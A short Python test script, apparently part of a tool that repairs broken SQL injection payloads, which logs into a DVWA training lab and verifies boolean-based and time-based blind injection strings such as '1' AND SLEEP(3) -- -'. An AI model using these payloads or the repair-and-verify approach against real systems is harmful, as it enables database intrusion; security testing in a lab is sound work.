from verifier import DVWAVerifier


verifier = DVWAVerifier(
    base_host="http://192.168.64.7",
    username="admin",
    password="password"
)


if not verifier.login():
    print("❌ Login failed")
    exit()


print("\n=== BOOLEAN TEST ===")

boolean_entry = {
    "broken_payload": "1' AND 1=0 -- -",
    "strategy": "SWITCH_BOOLEAN",
    "repaired_payload": "1' AND 1=1 -- -"
}

verified, details = verifier.verify_repair(
    boolean_entry
)

print("Verified:", verified)
print(details)


print("\n=== TIME TEST ===")

time_entry = {
    "broken_payload": "1' AND SLEP(3) -- -",
    "strategy": "SWITCH_TIME",
    "repaired_payload": "1' AND SLEEP(3) -- -"
}

verified, details = verifier.verify_repair(
    time_entry
)

print("Verified:", verified)
print(details)
